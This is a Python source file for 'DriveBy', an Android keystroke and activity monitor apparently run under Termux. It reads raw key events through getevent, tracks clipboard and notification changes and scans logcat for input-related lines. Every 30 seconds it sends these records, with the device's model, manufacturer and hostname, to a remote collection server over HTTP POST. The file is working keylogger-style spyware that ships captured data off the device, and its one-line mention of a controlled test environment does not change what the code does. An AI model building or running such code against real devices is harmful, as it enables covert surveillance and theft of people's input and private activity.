#!/usr/bin/env python3
"""
DriveBy Android Keystroke/Activity Monitor
Python script for observing input-related activity on Android devices (intended for Termux).
Note: Requires appropriate permissions and a controlled test environment.
"""

import os
import sys
import time
import json
import subprocess
import socket
from datetime import datetime
from typing import Dict, Any, List, Optional

import requests


class AndroidKeystrokeMonitor:
    def __init__(self, server_ip: str = "192.168.43.1", server_port: int = 8081):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_url = f"http://{server_ip}:{server_port}/collect"
        self.keystroke_buffer: List[Dict[str, Any]] = []
        self.running = True
        self.last_send = time.time()
        self.client_info = self.get_client_info()
        self.last_clipboard: str = ""
        self.last_notifications: str = ""

    # ----------------------
    # Device/Environment Info
    # ----------------------
    def get_client_info(self) -> Dict[str, Any]:
        """Get Android device information."""
        info: Dict[str, Any] = {
            "hostname": socket.gethostname(),
            "username": os.getenv("USER", "termux"),
            "os": "Android",
            "timestamp": datetime.now().isoformat(),
        }
        try:
            # Android version
            result = subprocess.run(
                ["getprop", "ro.build.version.release"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                info["android_version"] = result.stdout.strip()

            # Device model
            result = subprocess.run(
                ["getprop", "ro.product.model"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                info["device_model"] = result.stdout.strip()

            # Manufacturer
            result = subprocess.run(
                ["getprop", "ro.product.manufacturer"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                info["manufacturer"] = result.stdout.strip()
        except Exception as e:
            info["android_info_error"] = str(e)

        return info

    def check_termux_environment(self) -> bool:
        """Check if running in Termux environment."""
        return os.path.exists("/data/data/com.termux") or "termux" in os.getenv("PREFIX", "").lower()

    def setup_termux_permissions(self) -> None:
        """Setup necessary Termux permissions and packages."""
        print("Setting up Termux permissions and packages...")
        try:
            # Request storage permission
            try:
                subprocess.run(["termux-setup-storage"], timeout=10)
                print("Requested storage permission (termux-setup-storage)")
            except Exception as e:
                print(f"termux-setup-storage error: {e}")

            # Install required packages (best-effort)
            packages = ["termux-api", "python"]
            for package in packages:
                try:
                    subprocess.run(["pkg", "install", "-y", package], timeout=120, capture_output=True)
                    print(f"Ensured package installed: {package}")
                except subprocess.TimeoutExpired:
                    print(f"Timeout installing {package}")
                except Exception as e:
                    print(f"Error installing {package}: {e}")
        except Exception as e:
            print(f"Error setting up Termux environment: {e}")

    # ----------------------
    # Monitoring Backends
    # ----------------------
    def monitor_input_events(self) -> bool:
        """
        Monitor Android input events using 'getevent'.
        Returns True once monitoring has started (blocks until stopped).
        """
        try:
            # Quick availability check
            result = subprocess.run(["getevent", "-t"], capture_output=True, text=True, timeout=2)
            if result.returncode != 0 and not result.stdout:
                print("getevent not available or insufficient permissions")
                return False
        except Exception as e:
            print(f"getevent check failed: {e}")
            return False

        print("Started input event monitoring via getevent...")
        try:
            process = subprocess.Popen(
                ["getevent", "-t"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
            )
        except Exception as e:
            print(f"Failed to start getevent: {e}")
            return False

        try:
            assert process.stdout is not None
            while self.running:
                line = process.stdout.readline()
                if not line:
                    # Process ended or no more data
                    if process.poll() is not None:
                        break
                    time.sleep(0.1)
                    continue

                self.process_input_event(line.strip())

                # Periodic send
                if time.time() - self.last_send >= 30:
                    self.send_keystroke_data()
        except Exception as e:
            print(f"Error reading input events: {e}")
        finally:
            try:
                process.terminate()
            except Exception:
                pass
        return True

    def process_input_event(self, event_line: str) -> None:
        """Process a single input event line from getevent -t output."""
        try:
            # Expected format example:
            # [  1605.123456] /dev/input/event2: 0001 0038 00000001
            if "[" in event_line and "]" in event_line:
                parts = event_line.split("] ", 1)
                if len(parts) != 2:
                    return
                timestamp_str = parts[0].lstrip("[").strip()
                payload = parts[1].strip()

                # Split payload by spaces; minimum 4 tokens expected
                tokens = payload.replace(":", " ").split()
                if len(tokens) < 4:
                    return

                device = tokens[0]
                event_type = tokens[1]
                code = tokens[2]
                value = tokens[3]

                # Key press (EV_KEY == 0001 and value non-zero)
                if event_type.lower() == "0001" and value != "00000000":
                    keystroke_info = {
                        "timestamp": datetime.now().isoformat(),
                        "device": device,
                        "event_type": "key_event",
                        "key_code": code,
                        "raw_event": event_line[:200],
                    }
                    self.keystroke_buffer.append(keystroke_info)
        except Exception as e:
            print(f"Error processing event: {e}")

    def monitor_termux_api(self) -> bool:
        """Monitor using Termux API (clipboard and notifications as proxies)."""
        print("Using Termux API monitoring...")
        try:
            while self.running:
                try:
                    # Clipboard
                    result = subprocess.run(["termux-clipboard-get"], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        clipboard_content = result.stdout.strip()
                        if clipboard_content and clipboard_content != self.last_clipboard:
                            keystroke_info = {
                                "timestamp": datetime.now().isoformat(),
                                "event_type": "clipboard_change",
                                "content_length": len(clipboard_content),
                                "content_hash": hash(clipboard_content),
                            }
                            self.keystroke_buffer.append(keystroke_info)
                            self.last_clipboard = clipboard_content

                    # Notifications
                    try:
                        result = subprocess.run(
                            ["termux-notification-list"], capture_output=True, text=True, timeout=5
                        )
                        if result.returncode == 0:
                            notifications = result.stdout.strip()
                            if notifications != self.last_notifications:
                                keystroke_info = {
                                    "timestamp": datetime.now().isoformat(),
                                    "event_type": "notification_change",
                                    "notification_count": len(notifications.splitlines()) if notifications else 0,
                                }
                                self.keystroke_buffer.append(keystroke_info)
                                self.last_notifications = notifications
                    except Exception:
                        pass

                    # Periodic send
                    if time.time() - self.last_send >= 30:
                        self.send_keystroke_data()

                    time.sleep(2)
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"Error in Termux API monitoring loop: {e}")
                    time.sleep(5)
        except Exception as e:
            print(f"Termux API monitoring failed to start: {e}")
            return False
        return True

    def monitor_logcat(self) -> bool:
        """Monitor Android logcat for potential input-related log lines."""
        print("Monitoring logcat for input events...")
        try:
            process = subprocess.Popen(
                ["logcat", "-v", "time", "*:I"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
            )
        except Exception as e:
            print(f"Failed to start logcat: {e}")
            return False

        try:
            assert process.stdout is not None
            while self.running:
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    time.sleep(0.1)
                    continue

                low = line.lower()
                if "input" in low or "key" in low:
                    keystroke_info = {
                        "timestamp": datetime.now().isoformat(),
                        "event_type": "logcat_input",
                        "log_line": line.strip()[:200],
                    }
                    self.keystroke_buffer.append(keystroke_info)

                if time.time() - self.last_send >= 30:
                    self.send_keystroke_data()
        except Exception as e:
            print(f"Error reading logcat: {e}")
        finally:
            try:
                process.terminate()
            except Exception:
                pass
        return True

    # ----------------------
    # Networking
    # ----------------------
    def send_keystroke_data(self) -> None:
        """Send buffered data to server."""
        if not self.keystroke_buffer:
            return
        try:
            data = {
                "client_info": self.client_info,
                "keystrokes": self.keystroke_buffer.copy(),
                "batch_info": {
                    "count": len(self.keystroke_buffer),
                    "start_time": self.keystroke_buffer[0]["timestamp"] if self.keystroke_buffer else None,
                    "end_time": self.keystroke_buffer[-1]["timestamp"] if self.keystroke_buffer else None,
                },
            }
            response = requests.post(
                self.server_url,
                json=data,
                timeout=10,
                headers={"Content-Type": "application/json"},
            )
            if response.status_code == 200:
                print(f"Sent {len(self.keystroke_buffer)} events to server")
                self.keystroke_buffer.clear()
                self.last_send = time.time()
            else:
                print(f"Server responded with status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending data to server: {e}")
        except Exception as e:
            print(f"Unexpected error sending data: {e}")

    # ----------------------
    # Control
    # ----------------------
    def start_monitoring(self) -> None:
        """Start Android monitoring with best-effort backends."""
        print("DriveBy Android Monitor Starting...")
        print(f"Server: {self.server_url}")
        print(f"Client: {self.client_info.get('hostname', 'unknown')}")
        print(
            f"Device: {self.client_info.get('manufacturer', '')} {self.client_info.get('device_model', '')}"
        )

        if not self.check_termux_environment():
            print("Warning: Not running in Termux environment")
        else:
            print("Termux environment detected")
            self.setup_termux_permissions()

        # Try different monitoring methods in order of preference
        methods = [
            ("Input Events", self.monitor_input_events),
            ("Termux API", self.monitor_termux_api),
            ("Logcat", self.monitor_logcat),
        ]

        started = False
        for method_name, method_func in methods:
            try:
                print(f"Trying {method_name} monitoring...")
                if method_func():
                    print(f"{method_name} monitoring started. Press Ctrl+C to stop.")
                    started = True
                    break
                else:
                    print(f"{method_name} monitoring could not start, trying next method...")
            except Exception as e:
                print(f"Error with {method_name} monitoring: {e}")
                continue

        if not started:
            print("All monitoring methods failed to start")

        # If a method has returned (non-blocking), keep a simple idle loop to allow periodic sends
        try:
            while self.running and not started:
                time.sleep(1)
                if time.time() - self.last_send >= 30:
                    self.send_keystroke_data()
        except KeyboardInterrupt:
            pass

    def stop_monitoring(self) -> None:
        """Stop monitoring and send remaining data."""
        print("Stopping Android monitor...")
        self.running = False
        if self.keystroke_buffer:
            self.send_keystroke_data()
        print("Android monitor stopped.")


def main() -> None:
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="DriveBy Android Keystroke Monitor")
    parser.add_argument("--server", default="192.168.43.1", help="Server IP address")
    parser.add_argument("--port", type=int, default=8081, help="Server port")
    parser.add_argument("--setup", action="store_true", help="Setup Termux environment and exit")

    args = parser.parse_args()

    monitor = AndroidKeystrokeMonitor(args.server, args.port)

    if args.setup:
        monitor.setup_termux_permissions()
        return

    try:
        monitor.start_monitoring()
    except KeyboardInterrupt:
        print("\nReceived interrupt signal...")
    finally:
        monitor.stop_monitoring()


if __name__ == "__main__":
    main()
